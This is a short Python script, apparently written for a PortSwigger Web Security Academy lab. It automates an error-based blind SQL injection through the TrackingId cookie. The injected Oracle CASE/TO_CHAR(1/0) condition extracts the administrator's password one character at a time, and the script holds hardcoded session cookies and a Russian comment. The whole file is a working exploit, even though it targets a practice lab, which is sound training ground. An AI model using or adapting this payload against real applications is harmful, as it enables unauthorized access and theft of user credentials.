import requests
import time

url = "https://0a5b00e0036879cf80da171300380039.web-security-academy.net/filter"
params = {
    
     "category": "Gifts"
}

cookies = {
    'TrackingId': 'htZCLNB4FbMRvhpM',
    'session': 't2yjWHVuq84i5loL20HP4ZUcteFHYjsD'
}
password = ""
for x in range(20,22): 
    for y in range(48, 123):
     # SQL инъекция для проверки x-го символа
     cookies['TrackingId'] = f"htZCLNB4FbMRvhpM' AND(SELECT CASE WHEN (SUBSTR(password,{x}, 1) = '{chr(y).lower()}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') IS NULL--"
     response = requests.get(url, params=params, cookies=cookies)
     print(password,chr(y))
     if response.status_code != 200 and chr(y) not in {";"}:
        print("FIND SIM")
        password += chr(y)
        break